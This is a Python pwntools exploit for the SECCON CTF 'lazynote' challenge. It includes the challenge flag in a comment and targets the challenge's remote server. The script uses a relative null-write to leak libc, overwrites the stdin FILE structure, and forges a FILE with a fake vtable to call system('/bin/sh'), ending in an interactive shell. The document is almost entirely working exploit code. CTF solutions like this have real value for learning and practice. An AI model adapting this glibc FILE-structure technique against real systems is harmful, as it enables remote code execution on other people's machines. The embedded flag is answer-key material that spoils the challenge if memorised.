#exploit for lazynote
#SECCON{r3l4t1v3_nu11_wr1t3_pr1m1t1v3_2_sh3ll}
from pwn import *
import time
elf = ELF("./chall")
libc=elf.libc
context.binary=elf
#target=process([elf.path])
target=remote('pwn-neko.chal.seccon.jp',9003)
context.log_level='DEBUG'

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

def attack(allocsize,readsize,data="A"):	
	sla("> ",str(1))
	sla("alloc size: ",str(allocsize))
	sla("read size: ",str(readsize))
	sla("data: ",data)

def attack2(allocsize,readsize,data="A"):
	time.sleep(1)
	target.sendline(str(1))
	time.sleep(1)
	target.sendline(str(0x1000000))
	time.sleep(1)
	target.sendline(str(0x23ee750+0x11))
	time.sleep(1)
	target.sendline("A")

attack(0x1000000,0x13ed750+0x21)
attack2(0x1000000,0x23ee750+0x11)
libc_base=u64(target.recv(0xe3)[8:0x10])-0x3ed8b0
libc_stdin=libc_base+libc.sym["_IO_2_1_stdin_"]
libc_malloc_hook=libc_base+libc.sym["__malloc_hook"]
attack(0x1000000,0x33ee9f0+0x39)
payload=p64(0xfbad208b)
payload+=p64(libc_stdin+0x80-1)
payload+=p64(libc_stdin+0x80-0x48)
payload+=p64(libc_stdin+0x7f)*4
payload+=p64(libc_stdin)
payload+=p64(libc_stdin+0x100)
sa("> ",payload)	
rip=libc_base+libc.symbols['system']
rdi=libc_base+next(libc.search("/bin/sh"))
io_str_overflow_ptr_addr=libc_base+libc.symbols['_IO_file_jumps']+0xd8
fake_vtable_addr=io_str_overflow_ptr_addr-5*8
fileStr=FileStructure(null=libc_malloc_hook)
fileStr.flags=0
fileStr._IO_read_end=libc_stdin-0xe8
fileStr._IO_read_ptr=libc_stdin+0x80-0x1
fileStr._IO_buf_base=0
fileStr._IO_buf_end=(rdi-100)/2
fileStr._IO_write_ptr=p64(libc_stdin-0xe8)
fileStr._IO_write_base=0
fileStr.vtable=p64(fake_vtable_addr)
payload=str(fileStr)
payload+=p64(rip)
time.sleep(5)
target.send(payload)
target.interactive()
